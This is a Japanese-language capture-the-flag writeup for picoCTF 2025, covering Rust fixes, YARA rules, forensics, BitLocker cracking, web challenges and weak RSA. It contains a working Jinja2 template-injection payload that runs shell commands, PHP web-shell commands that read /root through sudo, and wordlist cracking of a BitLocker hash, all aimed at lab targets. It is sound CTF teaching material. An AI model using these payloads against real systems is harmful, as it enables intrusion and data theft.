---
title: "picoCTF 2025 Writeup"
date: 2025-04-05T10:00:00+09:00
lastmod: 2025-04-05T10:00:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: ""
---
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">

{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fpicoctf_2025%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

URL: [https://picoctf.org/](https://picoctf.org/)
<br /><br />
去年（2024年）は、picoCTFに参加することをすっかり忘れてましたが、今年は参加できました。

<br /><br />
M1 Mac にしてから、CTFがやりにくくなった気がします。。。

<br /><br />
最終結果は、こんな感じ。

<img src="https://captureamerica.github.io/writeups/img/picoctf_2025_Score1.png" alt="picoctf_2025_Score1.png">

<br /><br />

2610点をとって、最終順位は 1025位でした。
<br />
<img src="https://captureamerica.github.io/writeups/img/picoctf_2025_Rank.png" alt="picoctf_2025_Rank.png">


<br /><br />
以下は、チャレンジ一覧です。

<img src="https://captureamerica.github.io/writeups/img/picoctf_2025_web.png" alt="picoctf_2025_web.png">

<br />

<img src="https://captureamerica.github.io/writeups/img/picoctf_2025_crypto.png" alt="picoctf_2025_crypto.png">

<br />

<img src="https://captureamerica.github.io/writeups/img/picoctf_2025_rev.png" alt="picoctf_2025_rev.png">

<br />

<img src="https://captureamerica.github.io/writeups/img/picoctf_2025_forensics.png" alt="picoctf_2025_forensics.png">

<br />

<img src="https://captureamerica.github.io/writeups/img/picoctf_2025_general.png" alt="picoctf_2025_general.png">

<br />

<img src="https://captureamerica.github.io/writeups/img/picoctf_2025_pwn.png" alt="picoctf_2025_pwn.png">



<br /><br /><br />
以下、Writeupです。

<br />

## [General Skills]: Rust fixme 1 (100 points)
- - -
### Challenge
> Have you heard of Rust? Fix the syntax errors in this Rust file to print the flag!
<br /><br />
Hint1: Cargo is Rust's package manager and will make your life easier. See the getting started page here
<br />
Hint2: println!  (https://doc.rust-lang.org/std/macro.println.html)
<br />
Hint3: Rust has some pretty great compiler error messages. Read them maybe?

Attachment:

- fixme1.tar.gz

<br />

### Solution

Rustの実行環境がなかったので、[オンライン](https://www.programiz.com/rust/online-compiler/)でやればいいやと思ってたんですが、以下のエラーが出て小一時間悩みました。

<pre>
unresolved import `xor_cryptor`
</pre>

<br />

結局、RustをKaliにインストールして対応しました。

<pre>
$ curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
</pre>

<br />

ソースコードの修正をしていきます。

以下がオリジナル。

{{< highlight rust "linenos=table,hl_lines=5 18 25" >}}
use xor_cryptor::XORCryptor;

fn main() {
    // Key for decryption
    let key = String::from("CSUCKS") // How do we end statements in Rust?

    // Encrypted flag values
    let hex_values = ["41", "30", "20", "63", "4a", "45", "54", "76", "01", "1c", "7e", "59", "63", "e1", "61", "25", "7f", "5a", "60", "50", "11", "38", "1f", "3a", "60", "e9", "62", "20", "0c", "e6", "50", "d3", "35"];

    // Convert the hexadecimal strings to bytes and collect them into a vector
    let encrypted_buffer: Vec<u8> = hex_values.iter()
        .map(|&hex| u8::from_str_radix(hex, 16).unwrap())
        .collect();

    // Create decrpytion object
    let res = XORCryptor::new(&key);
    if res.is_err() {
        ret; // How do we return in rust?
    }
    let xrc = res.unwrap();

    // Decrypt flag and print it out
    let decrypted_buffer = xrc.decrypt_vec(encrypted_buffer);
    println!(
        ":?", // How do we print out a variable in the println function? 
        String::from_utf8_lossy(&decrypted_buffer)
    );
}
{{< / highlight >}}

<br />


<br />

以下が修正後。

{{< highlight rust "linenos=table,hl_lines=5 18 25" >}}
use xor_cryptor::XORCryptor;

fn main() {
    // Key for decryption
    let key = String::from("CSUCKS"); // How do we end statements in Rust?

    // Encrypted flag values
    let hex_values = ["41", "30", "20", "63", "4a", "45", "54", "76", "01", "1c", "7e", "59", "63", "e1", "61", "25", "7f", "5a", "60", "50", "11", "38", "1f", "3a", "60", "e9", "62", "20", "0c", "e6", "50", "d3", "35"];

    // Convert the hexadecimal strings to bytes and collect them into a vector
    let encrypted_buffer: Vec<u8> = hex_values.iter()
        .map(|&hex| u8::from_str_radix(hex, 16).unwrap())
        .collect();

    // Create decrpytion object
    let res = XORCryptor::new(&key);
    if res.is_err() {
        return; // How do we return in rust?
    }
    let xrc = res.unwrap();

    // Decrypt flag and print it out
    let decrypted_buffer = xrc.decrypt_vec(encrypted_buffer);
    println!(
        "{}", // How do we print out a variable in the println function? 
        String::from_utf8_lossy(&decrypted_buffer)
    );
}
{{< / highlight >}}

<br />


実行結果。

<pre>
$ cargo run --release --bin rust_proj
   Compiling crossbeam-utils v0.8.20
   Compiling rayon-core v1.12.1
   Compiling either v1.13.0
   Compiling crossbeam-epoch v0.9.18
   Compiling crossbeam-deque v0.8.5
   Compiling rayon v1.10.0
   Compiling xor_cryptor v1.2.3
   Compiling rust_proj v0.1.0 (/mnt/hgfs/Mac_Downloads/fixme1)
    Finished `release` profile [optimized] target(s) in 2.64s
     Running `target/release/rust_proj`
picoCTF{4r3_y0u_4_ru$t4c30n_n0w?}
</pre>

<br />

ちなみに、この次の Rust fixme 2 で与えられるファイルを見たら、Rust fixme 1 の答えが分かります。

<br />

Flag: `picoCTF{4r3_y0u_4_ru$t4c30n_n0w?}`


<br /><br />
<br /><br />
## [General Skills]: Rust fixme 2 (100 points)
- - -
### Challenge
> The Rust saga continues? I ask you, can I borrow that, pleeeeeaaaasseeeee?
<br /><br />
Hint: https://doc.rust-lang.org/book/ch04-02-references-and-borrowing.html

Attachment:

- fixme2.tar.gz

<br />

### Solution

Hintのままです。

<br />

ソースコードの修正をしていきます。

以下がオリジナル。

{{< highlight rust "linenos=table,hl_lines=3 34 35" >}}
use xor_cryptor::XORCryptor;

fn decrypt(encrypted_buffer:Vec<u8>, borrowed_string: &String){ // How do we pass values to a function that we want to change?

    // Key for decryption
    let key = String::from("CSUCKS");

    // Editing our borrowed value
    borrowed_string.push_str("PARTY FOUL! Here is your flag: ");

    // Create decrpytion object
    let res = XORCryptor::new(&key);
    if res.is_err() {
        return; // How do we return in rust?
    }
    let xrc = res.unwrap();

    // Decrypt flag and print it out
    let decrypted_buffer = xrc.decrypt_vec(encrypted_buffer);
    borrowed_string.push_str(&String::from_utf8_lossy(&decrypted_buffer));
    println!("{}", borrowed_string);
}


fn main() {
    // Encrypted flag values
    let hex_values = ["41", "30", "20", "63", "4a", "45", "54", "76", "01", "1c", "7e", "59", "63", "e1", "61", "25", "0d", "c4", "60", "f2", "12", "a0", "18", "03", "51", "03", "36", "05", "0e", "f9", "42", "5b"];

    // Convert the hexadecimal strings to bytes and collect them into a vector
    let encrypted_buffer: Vec<u8> = hex_values.iter()
        .map(|&hex| u8::from_str_radix(hex, 16).unwrap())
        .collect();

    let party_foul = String::from("Using memory unsafe languages is a: "); // Is this variable changeable?
    decrypt(encrypted_buffer, &party_foul); // Is this the correct way to pass a value to a function so that it can be changed?
}
{{< / highlight >}}

<br />


<br />

以下が修正後。

{{< highlight rust "linenos=table,hl_lines=3 34 35" >}}
use xor_cryptor::XORCryptor;

fn decrypt(encrypted_buffer:Vec<u8>, borrowed_string: &mut String){ // How do we pass values to a function that we want to change?

    // Key for decryption
    let key = String::from("CSUCKS");

    // Editing our borrowed value
    borrowed_string.push_str("PARTY FOUL! Here is your flag: ");

    // Create decrpytion object
    let res = XORCryptor::new(&key);
    if res.is_err() {
        return; // How do we return in rust?
    }
    let xrc = res.unwrap();

    // Decrypt flag and print it out
    let decrypted_buffer = xrc.decrypt_vec(encrypted_buffer);
    borrowed_string.push_str(&String::from_utf8_lossy(&decrypted_buffer));
    println!("{}", borrowed_string);
}


fn main() {
    // Encrypted flag values
    let hex_values = ["41", "30", "20", "63", "4a", "45", "54", "76", "01", "1c", "7e", "59", "63", "e1", "61", "25", "0d", "c4", "60", "f2", "12", "a0", "18", "03", "51", "03", "36", "05", "0e", "f9", "42", "5b"];

    // Convert the hexadecimal strings to bytes and collect them into a vector
    let encrypted_buffer: Vec<u8> = hex_values.iter()
        .map(|&hex| u8::from_str_radix(hex, 16).unwrap())
        .collect();

    let mut party_foul = String::from("Using memory unsafe languages is a: "); // Is this variable changeable?
    decrypt(encrypted_buffer, &mut party_foul); // Is this the correct way to pass a value to a function so that it can be changed?
}
{{< / highlight >}}

<br />

実行結果。

<pre>
$ cargo run --release --bin rust_proj
   Compiling crossbeam-utils v0.8.20
   Compiling rayon-core v1.12.1
   Compiling either v1.13.0
   Compiling crossbeam-epoch v0.9.18
   Compiling crossbeam-deque v0.8.5
   Compiling rayon v1.10.0
   Compiling xor_cryptor v1.2.3
   Compiling rust_proj v0.1.0 (/mnt/hgfs/Mac_Downloads/fixme2)
    Finished `release` profile [optimized] target(s) in 2.38s
     Running `target/release/rust_proj`
Using memory unsafe languages is a: PARTY FOUL! Here is your flag: picoCTF{4r3_y0u_h4v1n5_fun_y31?}
</pre>

<br />

ちなみに、この次の Rust fixme 3 で与えられるファイルを見たら、Rust fixme 2 の答えが分かります。

<br />

Flag: `picoCTF{4r3_y0u_h4v1n5_fun_y31?}`


<br /><br />
<br /><br />
## [General Skills]: Rust fixme 3 (100 points)
- - -
### Challenge
> Have you heard of Rust? Fix the syntax errors in this Rust file to print the flag!
Download the Rust code here.
<br /><br />
Hint: Read the comments...darn it!

Attachment:

- fixme3.tar.gz

<br />

### Solution

3つのうち、これが一番簡単。

<br />

ソースコードの修正をしていきます。

以下がオリジナル。

{{< highlight rust "linenos=table,hl_lines=22 34" >}}
use xor_cryptor::XORCryptor;

fn decrypt(encrypted_buffer: Vec<u8>, borrowed_string: &mut String) {
    // Key for decryption
    let key = String::from("CSUCKS");

    // Editing our borrowed value
    borrowed_string.push_str("PARTY FOUL! Here is your flag: ");

    // Create decryption object
    let res = XORCryptor::new(&key);
    if res.is_err() {
        return;
    }
    let xrc = res.unwrap();

    // Did you know you have to do "unsafe operations in Rust?
    // https://doc.rust-lang.org/book/ch19-01-unsafe-rust.html
    // Even though we have these memory safe languages, sometimes we need to do things outside of the rules
    // This is where unsafe rust comes in, something that is important to know about in order to keep things in perspective
    
    // unsafe {
        // Decrypt the flag operations 
        let decrypted_buffer = xrc.decrypt_vec(encrypted_buffer);

        // Creating a pointer 
        let decrypted_ptr = decrypted_buffer.as_ptr();
        let decrypted_len = decrypted_buffer.len();
        
        // Unsafe operation: calling an unsafe function that dereferences a raw pointer
        let decrypted_slice = std::slice::from_raw_parts(decrypted_ptr, decrypted_len);

        borrowed_string.push_str(&String::from_utf8_lossy(decrypted_slice));
    // }
    println!("{}", borrowed_string);
}

fn main() {
    // Encrypted flag values
    let hex_values = ["41", "30", "20", "63", "4a", "45", "54", "76", "12", "90", "7e", "53", "63", "e1", "01", "35", "7e", "59", "60", "f6", "03", "86", "7f", "56", "41", "29", "30", "6f", "08", "c3", "61", "f9", "35"];

    // Convert the hexadecimal strings to bytes and collect them into a vector
    let encrypted_buffer: Vec<u8> = hex_values.iter()
        .map(|&hex| u8::from_str_radix(hex, 16).unwrap())
        .collect();

    let mut party_foul = String::from("Using memory unsafe languages is a: ");
    decrypt(encrypted_buffer, &mut party_foul);
}
{{< / highlight >}}

<br />


<br />

以下が修正後。

{{< highlight rust "linenos=table,hl_lines=22 34" >}}
use xor_cryptor::XORCryptor;

fn decrypt(encrypted_buffer: Vec<u8>, borrowed_string: &mut String) {
    // Key for decryption
    let key = String::from("CSUCKS");

    // Editing our borrowed value
    borrowed_string.push_str("PARTY FOUL! Here is your flag: ");

    // Create decryption object
    let res = XORCryptor::new(&key);
    if res.is_err() {
        return;
    }
    let xrc = res.unwrap();

    // Did you know you have to do "unsafe operations in Rust?
    // https://doc.rust-lang.org/book/ch19-01-unsafe-rust.html
    // Even though we have these memory safe languages, sometimes we need to do things outside of the rules
    // This is where unsafe rust comes in, something that is important to know about in order to keep things in perspective
    
    unsafe {
        // Decrypt the flag operations 
        let decrypted_buffer = xrc.decrypt_vec(encrypted_buffer);

        // Creating a pointer 
        let decrypted_ptr = decrypted_buffer.as_ptr();
        let decrypted_len = decrypted_buffer.len();
        
        // Unsafe operation: calling an unsafe function that dereferences a raw pointer
        let decrypted_slice = std::slice::from_raw_parts(decrypted_ptr, decrypted_len);

        borrowed_string.push_str(&String::from_utf8_lossy(decrypted_slice));
    }
    println!("{}", borrowed_string);
}

fn main() {
    // Encrypted flag values
    let hex_values = ["41", "30", "20", "63", "4a", "45", "54", "76", "12", "90", "7e", "53", "63", "e1", "01", "35", "7e", "59", "60", "f6", "03", "86", "7f", "56", "41", "29", "30", "6f", "08", "c3", "61", "f9", "35"];

    // Convert the hexadecimal strings to bytes and collect them into a vector
    let encrypted_buffer: Vec<u8> = hex_values.iter()
        .map(|&hex| u8::from_str_radix(hex, 16).unwrap())
        .collect();

    let mut party_foul = String::from("Using memory unsafe languages is a: ");
    decrypt(encrypted_buffer, &mut party_foul);
}
{{< / highlight >}}

<br />

実行結果。

<pre>
$ cargo run --release --bin rust_proj
   Compiling crossbeam-utils v0.8.20
   Compiling rayon-core v1.12.1
   Compiling either v1.13.0
   Compiling crossbeam-epoch v0.9.18
   Compiling crossbeam-deque v0.8.5
   Compiling rayon v1.10.0
   Compiling xor_cryptor v1.2.3
   Compiling rust_proj v0.1.0 (/mnt/hgfs/Mac_Downloads/fixme3)
    Finished `release` profile [optimized] target(s) in 2.36s
     Running `target/release/rust_proj`
Using memory unsafe languages is a: PARTY FOUL! Here is your flag: picoCTF{n0w_y0uv3_f1x3d_1h3m_411}
</pre>

<br />

Flag: `picoCTF{n0w_y0uv3_f1x3d_1h3m_411}`



<br /><br />
<br /><br />
## [General Skills]: YaraRules0x100 (200 points)
- - -
### Challenge
> Dear Threat Intelligence Analyst,<br />
Quick heads up - we stumbled upon a shady executable file on one of our employee's Windows PCs. Good news: the employee didn't take the bait and flagged it to our InfoSec crew.<br />
Seems like this file sneaked past our Intrusion Detection Systems, indicating a fresh threat with no matching signatures in our database.<br />
Can you dive into this file and whip up some YARA rules? We need to make sure we catch this thing if it pops up again.<br />
Thanks a bunch!<br />
The suspicious file can be downloaded here. Unzip the archive with the password picoctf<br />
Once you have created the YARA rule/signature, submit your rule file as follows:<br />
socat -t60 - TCP:standard-pizzas.picoctf.net:51964 < sample.txt<br />
(In the above command, modify "sample.txt" to whatever filename you use).<br />
When you submit your rule, it will undergo testing with various test cases. If it successfully passes all the test cases, you'll receive your flag.<br />
<br /><br />
Hint1: The test cases will attempt to match your rule with various variations of this suspicious file, including a packed version, an unpacked version, slight modifications to the file while retaining functionality, etc.
<br /><br />
Hint2: Since this is a Windows executable file, some strings within this binary can be "wide" strings. Try declaring your string variables something like $str = "Some Text" wide ascii wherever necessary.
<br /><br />
Hint3: Your rule should also not generate any false positives (or false negatives). Refine your rule to perfection! One YARA rule file can have multiple rules! Maybe define one rule for Packed binary and another rule for Unpacked binary in the same rule file?


Attachment:

- suspicious.exe


<br />

### Solution

まずは `file` コマンドを実行。UPX で Pack されているのがわかります。

<pre>
$ file suspicious.exe
suspicious.exe: PE32 executable (GUI) Intel 80386, for MS Windows, UPX compressed
</pre>

<br />

UPXを検知する yara rule はググったら見つかります。

https://github.com/godaddy/yara-rules/blob/master/packers/upx.yara


<br /><br />

テスト

<pre>
$ yara -r YaraRules0x100.yar .
upx ./suspicious.exe
</pre>


<br /><br />

とりあえず、この Rule だけでどういう結果が得られるか見てみます。

<pre>
$ socat -t60 - TCP:standard-pizzas.picoctf.net:51964 < YaraRules0x100.yar
:::::

Status: Failed
False Negatives Check: Testcase failed. Your rule generated a false negative.
False Positives Check: Testcases passed!
Stats: 62 testcase(s) passed. 1 failed. 1 testcase(s) unchecked. 64 total testcases.
Pass all the testcases to get the flag.

:::::
</pre>

<br />
False Negativeがあるので、UPX で Pack されていないもの（つまり、Unpackされたもの）が1つあるみたいです。

Hintでも、そのことに触れられていましたね。

<br /><br />

Unpack をして、ユニークな文字列を探してみます。

<pre>
$ upx -d suspicious.exe -o unpacked_suspicious.exe

$ strings -a -e l unpacked_suspicious.exe
jjjjjj
jjjj
ntdll.dll
(Ignore) error related to Ntdll. Falling back.
[FATAL ERROR] CreateToolhelp32Snapshot failed.
[FATAL ERROR] OpenProcessToken failed.
SeDebugPrivilege
[FATAL ERROR] LookupPrivilegeValue failed.
[FATAL ERROR] AdjustTokenPrivileges failed.
Please run this program as an Admin.
[FATAL ERROR] Failed to create the Mutex.
[ERROR] Exactly two arguments expected by the Child process. Exiting...
Check if the program is already running.
Error converting WChar to Char.
No debugger was present. Exiting successfully.
Error opening a handle to debuggerPID.
Debugger process terminated successfully.
Failed to terminate the debugger process.
[FATAL ERROR]  Unable to create the child process.
Something went wrong.
The debugger was detected but our process wasn't able to fight it. Exiting the program.
Our process detected the debugger and was able to fight it. Don't be surprised if the debugger crashed.
picoCTF
This is a fake malware. It means no harm.
Hints:
- To develop an effective YARA rule, find any suspicious Win32 API functions that are being used by this program.
- Developing rules solely based on strings (excluding URLs, library function calls, etc.) is not a good idea, as it can lead to false positives.
- Your rules should work even if this binary is packed (or unpacked).
Good luck!
Oops! Debugger Detected. Fake malware will try to hide itself (but not really).
Error creating the thread. Exiting...
&File
iE&xit
&Help
h&About ...
About Suspicious
MS Shell Dlg
Created by Nandan Desai
Copyright (c) 2023
Suspicious
SUSPICIOUS
</pre>


<br />

上記の `strings` コマンドの出力結果の中に、別の Hint が出てきています。（以下の部分）

<pre>
Hints:
- To develop an effective YARA rule, find any suspicious Win32 API functions that are being used by this program.
- Developing rules solely based on strings (excluding URLs, library function calls, etc.) is not a good idea, as it can lead to false positives.
- Your rules should work even if this binary is packed (or unpacked).
</pre>


<br />

ここからは、トライ アンド エラーでした。人によって回答が違うと思います。

<br />

以下が、フラグが取れたときの Yara Rule です。

```c
rule upx {
    meta:
        description = "UPX packed file"

        block = false
        quarantine = false

    strings:
        $mz = "MZ"
        $upx1 = {55505830000000}
        $upx2 = {55505831000000}
        $upx_sig = "UPX!"

    condition:
        $mz at 0 and $upx1 in (0..1024) and $upx2 in (0..1024) and $upx_sig in (0..1024)
}

rule YaraRules0x100 {
    meta:
        description = "str check"

    strings:
        $a = "CreateToolhelp32Snapshot" wide ascii
	$b = "Debugger Detected" wide ascii
        $upx_sig = "UPX!"

    condition:
        $a and $b and not $upx_sig in (0..1024)
}
```


<br />

`rule upx` は、githubにあったコードをそのまま使用。

`rule YaraRules0x100` の方では、suspicious Win32 API functions を２つチェックし、かつ Unpack されたもの（UPXで Pack されていないもの）をチェックしています。

<br />

<pre>
$ socat -t60 - TCP:standard-pizzas.picoctf.net:50087 < YaraRules0x100.yar
:::::

Status: Passed
Congrats! Here is your flag: picoCTF{yara_rul35_r0ckzzz_12a4da12}

:::::
</pre>

<br />

Flag: `picoCTF{yara_rul35_r0ckzzz_12a4da12}`


<br /><br />
<br /><br />
## [Forensics]: Ph4nt0m 1ntrud3r (50 points)
- - -
### Challenge
> A digital ghost has breached my defenses, and my sensitive data has been stolen! 😱💻 Your mission is to uncover how this phantom intruder infiltrated my system and retrieve the hidden flag.<br />
To solve this challenge, you'll need to analyze the provided PCAP file and track down the attack method. The attacker has cleverly concealed his moves in well timely manner. Dive into the network traffic, apply the right filters and show off your forensic prowess and unmask the digital intruder!<br />
Find the PCAP file here Network Traffic PCAP file and try to get the flag.
<br /><br />
Hint1: Filter your packets to narrow down your search.
<br /><br />
Hint2: Attacks were done in timely manner.
<br /><br />
Hint3: Time is essential


Attachment:

- myNetworkTraffic.pcap


<br />

### Solution

tshark コマンドを使って、TCP Payload を取り出してみます。

<pre>
$ tshark -r myNetworkTraffic.pcap -T fields -e "tcp.payload"
657a46305833633063773d3d
63476c6a62304e5552673d3d
626e52666447673064413d3d
5974386b734d4d3d
337073763543343d
595145467a49553d
596d68664e484a664f513d3d
6132332f5562493d
544f47534767343d
62707a513052383d
66513d3d
6e6675345677773d
4a3461755a4d593d
6550525844696f3d
666a497a51776b3d
585468477875453d
636b426b5a4c6b3d
434a72346f446b3d
42674a4c4230633d
587a4d3063336c6664413d3d
4e546c6d4e54426b4d773d3d
646756397630733d
</pre>

<br /><br />

Base64 の Padding (3d3d、すなわち"==") がついているので Base64 デコードを各行に対して行ったところ、TCP Length が 8 のものは文字列としてデコードできないようでした。

ということで、フィルターを使って不要なデータを除外します。

<pre>
$ tshark -r myNetworkTraffic.pcap -T fields -e "tcp.payload" -Y "tcp.len!=8"
657a46305833633063773d3d
63476c6a62304e5552673d3d
626e52666447673064413d3d
596d68664e484a664f513d3d
66513d3d
587a4d3063336c6664413d3d
4e546c6d4e54426b4d773d3d
</pre>

<br /><br />

Hint を元に、timestampも表示して、ソートします。

<pre>
$ tshark -r myNetworkTraffic.pcap -T fields -e "frame.time" -e "tcp.payload" -Y "tcp.len!=8" | sort
Mar  6, 2025 12:31:35.795918000 JST	63476c6a62304e5552673d3d
Mar  6, 2025 12:31:35.796143000 JST	657a46305833633063773d3d
Mar  6, 2025 12:31:35.796375000 JST	626e52666447673064413d3d
Mar  6, 2025 12:31:35.796700000 JST	587a4d3063336c6664413d3d
Mar  6, 2025 12:31:35.796941000 JST	596d68664e484a664f513d3d
Mar  6, 2025 12:31:35.797170000 JST	4e546c6d4e54426b4d773d3d
Mar  6, 2025 12:31:35.797392000 JST	66513d3d
</pre>

<br /><br />

あとは、文字に変換するだけです。

<pre>
$ tshark -r myNetworkTraffic.pcap -T fields -e "frame.time" -e "tcp.payload" -Y "tcp.len!=8" | sort | cut -f2 | xxd -r -p | base64 -d ; echo
picoCTF{1t_w4snt_th4t_34sy_tbh_4r_959f50d3}
</pre>


<br />

Flag: `picoCTF{1t_w4snt_th4t_34sy_tbh_4r_959f50d3}`




<br /><br />
<br /><br />
## [Forensics]: flags are stepic (100 points)
- - -
### Challenge
> A group of underground hackers might be using this legit site to communicate. Use your forensic techniques to uncover their message
Try it here!
<br /><br />
Hint: In the country that doesn't exist, the flag persists

<br />

### Solution

まずはウェブページのソースをテキストファイルに保存して、国コードのリストを取り出してみました。

<pre>
$ grep "flags/" flags_are_stepic_source.txt | cut -d'/' -f2 | cut -d'.' -f1
af
ax
al
dz
:
(snip)
:
gb
us
upz  <---- !!!
uy
uz
:
</pre>

<br /><br />

3文字の `upz` という怪しいものがあります。

その画像を見てみると（/flags/upz.png）、確かに国旗ではないようです。

<img src="https://captureamerica.github.io/writeups/img/upz.png" alt="upz.png" width=300 height=60>


いろいろと調べてみたところ、`stepic` という Python モジュールがあることがわかり、使い方を調べて upz.png をデコードしてみました。

<br />

以下が書いたコードです。

```python
from PIL import Image
import stepic
img2 = Image.open("upz.png")
data = stepic.decode(img2)
print("Decoded data : "+str(data))
```

<br /><br />

実行結果:

<pre>
$ python3 ./stepic_decode.py
/usr/lib/python3/dist-packages/PIL/Image.py:3218: DecompressionBombWarning: Image size (150658990 pixels) exceeds limit of 89478485 pixels, could be decompression bomb DOS attack.
  warnings.warn(
Decoded data : picoCTF{fl4g_h45_fl4ga664459a}
</pre>


<br />

Flag: `picoCTF{fl4g_h45_fl4ga664459a}`



<br /><br />
<br /><br />
## [Forensics]: Event-Viewing (200 points)
- - -
### Challenge
> One of the employees at your company has their computer infected by malware! Turns out every time they try to switch on the computer, it shuts down right after they log in. The story given by the employee is as follows:<br />
They installed software using an installer they downloaded online<br />
They ran the installed software but it seemed to do nothing<br />
Now every time they bootup and login to their computer, a black command prompt screen quickly opens and closes and their computer shuts down instantly.<br />
See if you can find evidence for the each of these events and retrieve the flag (split into 3 pieces) from the correct logs!
<br /><br />
Hint1: Try to filter the logs with the right event ID
<br />
Hint2: What could the software have done when it was ran that causes the shutdowns every time the system starts up?

- Windows_Logs.evtx


<br />

### Solution

Windows PC のイベントビューアーで Windows_Logs.evtx を読み込んで調べました。

<br /><br />

"shutdown" でサーチしたら Base64 エンコードされた文字列が見つかります。

<img src="https://captureamerica.github.io/writeups/img/picoctf_2025_WinEvent1.png" alt="picoctf_2025_WinEvent1.png">

<br /><br />

残りの2つは、"==" でサーチして見つけました。

<img src="https://captureamerica.github.io/writeups/img/picoctf_2025_WinEvent2.png" alt="picoctf_2025_WinEvent2.png">

<br /><br />

<img src="https://captureamerica.github.io/writeups/img/picoctf_2025_WinEvent3.png" alt="picoctf_2025_WinEvent3.png">


<br /><br />

Flag: `picoCTF{Ev3nt_vi3wv3r_1s_a_pr3tty_us3ful_t00l_81ba3fe9}`


<br /><br />
<br /><br />
## [Forensics]: Bitlocker-1 (200 points)
- - -
### Challenge
> Jacky is not very knowledgable about the best security passwords and used a simple password to encrypt their BitLocker drive. See if you can break through the encryption!

Attachment:

- bitlocker-1.dd (100MB)

<br />

### Solution

Kali に bitlocker2john がすでに入っていたので、それを使いました。（出力結果は省略）

<pre>
$ bitlocker2john -i bitlocker-1.dd > hash.txt
$ john hash.txt --wordlist=~/wordlists/rockyou.txt
</pre>

<br />

これで、`jacqueline` というパスワードが見つかります。

<br /><br />

ここからは、Windows PC の AutoPsy を使いました。

先ほど見つかったパスワードを使って、ファイルの中身を見ていくと、flag.txtが見つかります。

<img src="https://captureamerica.github.io/writeups/img/picoctf_2025_AutoPsy.png" alt="picoctf_2025_AutoPsy.png">


<br /><br />

Flag: `picoCTF{us3_b3tt3r_p4ssw0rd5_pl5!_3242adb1}`



<br /><br />
<br /><br />
## [Web]: n0s4n1ty 1 (100 points)
- - -
### Challenge
> A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the /root directory.
<br /><br />
Hint1: File upload was not sanitized
<br />
Hint2: Whenever you get a shell on a remote machine, check sudo -l

<br />

### Solution

サニタイズがされていないので、PHP の Web shell をアップロードして、それを使うだけです。

a.phpというファイルを作ってアップロードしました。

<br />

<img src="https://captureamerica.github.io/writeups/img/picoctf_2025_aphp.png" alt="picoctf_2025_aphp.png" width=300 height=60>

<br /><br />

<pre>
http://standard-pizzas.picoctf.net:51712/uploads/a.php?cmd=sudo -l
http://standard-pizzas.picoctf.net:51712/uploads/a.php?cmd=sudo cat /root/flag.txt
</pre>

<br />

Flag: `picoCTF{wh47_c4n_u_d0_wPHP_4043cda3}`


<br /><br />
<br /><br />
## [Web]: SSTI2 (200 points)
- - -
### Challenge
> I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)<br />
I heard templating is a cool and modular way to build web apps! Check out my website here!
<br /><br />
Hint1: Server Side Template Injection
<br />
Hint2: Why is blacklisting characters a bad idea to sanitize input?

<br />

### Solution

Black list のバイパスがなかなか出来ずに結構試行錯誤をしたのですが、

以下のサイトに書かれているサンプルを使ったら、そのまま行けました。

https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f

<pre>
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
</pre>

<br />

Flag: `picoCTF{sst1_f1lt3r_byp4ss_ece726e9}`



<br /><br />
<br /><br />
## [Crypto]: EVEN RSA CAN BE BROKEN??? (200 points)
- - -
### Challenge
> This service provides you an encrypted flag. Can you decrypt it with just N & e?<br />
Connect to the program with netcat:
<br /><br />
Hint1: How much do we trust randomness?
<br /><br />
Hint2: Notice anything interesting about N?
<br /><br />
Hint3: Try comparing N across multiple requests

<br />

### Solution

Hint を元に、いくつかサンプルを集めて傾向を見ることにしました。

<pre>
$ nc verbal-sleep.picoctf.net 51624
N: 15011597723370625970175278550446842441472820011538256365596832808503849392426362376701897544864203610415636205947277203638791695202994114239414917448991866
e: 65537
cyphertext: 11870742963080785358411730864105202326585637170748591243517262296319996953298655433668433818798404934888882330038339838064138913817733910471654885076976627

$ nc verbal-sleep.picoctf.net 51624
N: 24045499541871971500675444118414331087201949280013008187969606893273730814495825624003150534117378982230294289676472858760526590191230465510897306998995534
e: 65537
cyphertext: 7975568915660088048579382997740376222901530549289757566064178450599924360171059171558200074021506539392061315001920794734320484943667743626436550719451927

$ nc verbal-sleep.picoctf.net 51624
N: 16999973870731977513276050547205289068142526016621272648326617590290000339331066413392966316011818246740851947973819144108569306513299866015339056450949774
e: 65537
cyphertext: 388354100763543080756460793652936406970160745126018474654530311167072472380674234633242076264308040359526728177861105960472223146033383052669759985398571
</pre>

<br />

N を factorize してみて分かったことは、pかqかの必ずどちらかが2になっている、ということでした。

<br />

以下が書いたコードです。

{{< highlight python "linenos=table,hl_lines=10 11" >}}
import math
from Crypto.Util.number import inverse

# RSA Data
n = 15011597723370625970175278550446842441472820011538256365596832808503849392426362376701897544864203610415636205947277203638791695202994114239414917448991866
e = 65537
c = 11870742963080785358411730864105202326585637170748591243517262296319996953298655433668433818798404934888882330038339838064138913817733910471654885076976627

#Solve for p,q
q = 2
p = n // q

# Standard RSA
phi = (p-1)*(q-1)
d = inverse(e,phi)
m = pow(c,d,n)
print(bytes.fromhex(format(m,'x')).decode('utf-8'))
{{< / highlight >}}


<br />

Flag: `picoCTF{tw0_1$_pr!m378257f39}`



<br /><br />
<br /><br />
